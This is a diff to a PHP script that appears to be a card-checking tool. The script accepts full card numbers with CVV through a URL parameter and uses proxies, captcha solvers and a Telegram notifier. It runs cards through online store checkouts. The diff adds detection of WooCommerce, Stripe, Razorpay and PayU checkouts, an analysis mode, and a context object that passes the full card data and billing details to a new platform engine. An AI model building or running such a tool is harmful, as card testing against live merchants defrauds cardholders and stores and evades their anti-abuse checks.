@@ -29,6 +29,7 @@ require_once 'CaptchaSolver.php';
 require_once 'AdvancedCaptchaSolver.php';
 require_once 'ProxyAnalytics.php';
 require_once 'TelegramNotifier.php';
+require_once 'PaymentPlatformEngine.php';
 
 // Initialize advanced systems
 $analytics = new ProxyAnalytics();
@@ -567,6 +568,83 @@ class GatewayDetector {
             'features' => ['ideal','bancontact'],
             'funding_types' => ['cards','local'],
         ],
+          'woocommerce_core' => [
+              'name' => 'WooCommerce Platform',
+              'keywords' => ['woocommerce', 'wc-checkout', 'woocommerce-checkout', 'wp-content/plugins/woocommerce', 'woocommerce-billing-fields'],
+              'url_keywords' => ['/?wc-ajax=checkout', 'wp-json/wc/', 'wc-api'],
+              'aliases' => ['woocommerce', 'woo commerce'],
+              'card_networks' => [],
+              'supports_cards' => true,
+              'three_ds' => 'depends',
+              'features' => ['wordpress','platform'],
+              'funding_types' => ['cards','local','wallet'],
+          ],
+          'woocommerce_stripe' => [
+              'name' => 'WooCommerce Stripe',
+              'keywords' => ['wc-stripe', 'woocommerce-gateway-stripe', 'stripe-payment-element', 'stripe-payment-intents', 'wc-stripe-card-element'],
+              'url_keywords' => ['stripe.com', 'woocommerce.com'],
+              'aliases' => ['woocommerce stripe', 'woo stripe', 'woocommerce payments'],
+              'card_networks' => ['visa','mastercard','amex','discover'],
+              'supports_cards' => true,
+              'three_ds' => '3ds2',
+              'features' => ['payment_intents','apple_pay','google_pay'],
+              'funding_types' => ['cards','wallets'],
+          ],
+          'woocommerce_razorpay' => [
+              'name' => 'WooCommerce Razorpay',
+              'keywords' => ['wc-razorpay', 'razorpay', 'razorpay_order_id', 'wc_payment_method_razorpay'],
+              'url_keywords' => ['razorpay.com'],
+              'aliases' => ['woocommerce razorpay'],
+              'card_networks' => ['visa','mastercard','amex','rupay'],
+              'supports_cards' => true,
+              'three_ds' => 'mandatory',
+              'features' => ['upi','emi','netbanking'],
+              'funding_types' => ['cards','upi','netbanking','wallet'],
+          ],
+          'woocommerce_payu' => [
+              'name' => 'WooCommerce PayU',
+              'keywords' => ['wc-payu', 'wc_payment_method_payu', 'payubiz', 'boltpay'],
+              'url_keywords' => ['payu.in', 'secure.payu', 'payu.lat'],
+              'aliases' => ['woocommerce payu', 'woo payu'],
+              'card_networks' => ['visa','mastercard','amex','diners'],
+              'supports_cards' => true,
+              'three_ds' => 'mandatory',
+              'features' => ['upi','netbanking','emi'],
+              'funding_types' => ['cards','upi','netbanking'],
+          ],
+          'stripe_checkout' => [
+              'name' => 'Stripe Checkout',
+              'keywords' => ['checkout.stripe.com', 'stripe-checkout-wrapper', 'stripe-session-id'],
+              'url_keywords' => ['checkout.stripe.com'],
+              'aliases' => ['stripe checkout session', 'stripe payment link'],
+              'card_networks' => ['visa','mastercard','amex','discover','jcb'],
+              'supports_cards' => true,
+              'three_ds' => '3ds2',
+              'features' => ['payment_links','apple_pay','google_pay'],
+              'funding_types' => ['cards','wallets'],
+          ],
+          'razorpay_checkout_hosted' => [
+              'name' => 'Razorpay Checkout (Hosted)',
+              'keywords' => ['checkout.razorpay.com', 'data-key="rzp_', 'razorpay-checkout'],
+              'url_keywords' => ['checkout.razorpay.com'],
+              'aliases' => ['razorpay hosted checkout'],
+              'card_networks' => ['visa','mastercard','amex','rupay'],
+              'supports_cards' => true,
+              'three_ds' => 'mandatory',
+              'features' => ['upi','netbanking','wallets'],
+              'funding_types' => ['cards','upi','netbanking','wallet'],
+          ],
+          'payu_checkout_hosted' => [
+              'name' => 'PayU Checkout (Hosted)',
+              'keywords' => ['secure.payu', 'payu.in/_payment', 'payuform'],
+              'url_keywords' => ['secure.payu', 'payu.in', 'payu.lat'],
+              'aliases' => ['payu checkout', 'payu hosted'],
+              'card_networks' => ['visa','mastercard','amex','diners'],
+              'supports_cards' => true,
+              'three_ds' => 'mandatory',
+              'features' => ['netbanking','upi','emi'],
+              'funding_types' => ['cards','upi','netbanking'],
+          ],
     ];
 
     private static function normalizeToken(string $value): string
@@ -1372,12 +1450,19 @@ if (!$noproxy_requested && !$proxy_used && $require_proxy) {
 }
 
 
-// Validate CC parameter
-if (!isset($_GET['cc']) || empty($_GET['cc'])) {
+$__flowModeRequest = isset($_GET['mode']) ? strtolower((string)$_GET['mode']) : 'auto';
+
+// Validate CC parameter (optional for analysis mode)
+if ($__flowModeRequest !== 'analysis' && (!isset($_GET['cc']) || empty($_GET['cc']))) {
     send_final_response(['Response' => 'CC parameter is required'], false, '', '');
 }
 
-$cc1 = $_GET['cc'];
+if ($__flowModeRequest === 'analysis' && (!isset($_GET['cc']) || empty($_GET['cc']))) {
+    // Placeholder card for metadata-only analysis; never transmitted to gateways.
+    $cc1 = '4111111111111111|12|2030|123';
+} else {
+    $cc1 = $_GET['cc'];
+}
 $cc_partes = explode("|", $cc1);
 
 if (count($cc_partes) < 4) {
@@ -1831,8 +1916,75 @@ if ($proxy_used) {
     }
 }
 
-    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
-    try {
+$flowMode = $__flowModeRequest;
+if (!isset($GLOBALS['__payment_context']) || !is_array($GLOBALS['__payment_context'])) {
+    $GLOBALS['__payment_context'] = [];
+}
+$GLOBALS['__payment_context']['mode'] = $flowMode;
+$GLOBALS['__payment_context']['card_last4'] = substr($cc, -4);
+
+$analysisContext = [
+    'site' => $site1,
+    'card' => [
+        'number' => $cc,
+        'exp_month' => $month,
+        'exp_year' => $year,
+        'cvv' => $cvv,
+    ],
+    'billing' => [
+        'first_name' => $firstname,
+        'last_name' => $lastname,
+        'email' => $email,
+        'phone' => $phone,
+        'address' => [
+            'line1' => $address,
+            'city' => $city_us,
+            'state' => $state_us,
+            'postal_code' => $zip_us,
+            'country' => 'US',
+        ],
+    ],
+    'geo' => [
+        'lat' => $lat,
+        'lon' => $lon,
+    ],
+    'flow_mode' => $flowMode,
+    'proxy_used' => $proxy_used,
+];
+
+if ($flowMode !== 'shopify') {
+    $siteProfile = platform_engine_detect_profile($site1);
+    $GLOBALS['__payment_context']['site_profile'] = [
+        'platform' => $siteProfile['platform'] ?? 'unknown',
+        'indicators' => $siteProfile['indicators'] ?? [],
+        'http_code' => $siteProfile['http_code'] ?? null,
+        'requires_js_checkout' => $siteProfile['requires_js_checkout'] ?? null,
+    ];
+
+    if ($flowMode === 'analysis' && ($siteProfile['platform'] ?? 'unknown') === 'shopify') {
+        $analysisResult = [
+            'Response' => 'Shopify storefront detected (analysis mode)',
+            'Flow' => 'analysis:shopify',
+            'Platform' => 'Shopify',
+            'GatewayCandidates' => $siteProfile['gateway_candidates'] ?? [],
+            'CheckoutPaths' => $siteProfile['checkout_paths'] ?? [],
+            'RequiresJsTokenisation' => false,
+            'Notes' => 'Use mode=shopify to execute the legacy card flow runner.',
+        ];
+        send_final_response($analysisResult, $proxy_used, $proxy_ip, $proxy_port);
+    }
+
+    $platformResult = platform_engine_try_handle($siteProfile, $analysisContext);
+    if (is_array($platformResult)) {
+        if (!isset($platformResult['Flow'])) {
+            $platformResult['Flow'] = 'analysis';
+        }
+        send_final_response($platformResult, $proxy_used, $proxy_ip, $proxy_port);
+    }
+}
+
+$site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
+try {
         $productsData = fetchProductsJson($site2, 'cookie.txt');
         $r1 = json_encode($productsData);
         $productDetails = getMinimumPriceProductDetails($r1);
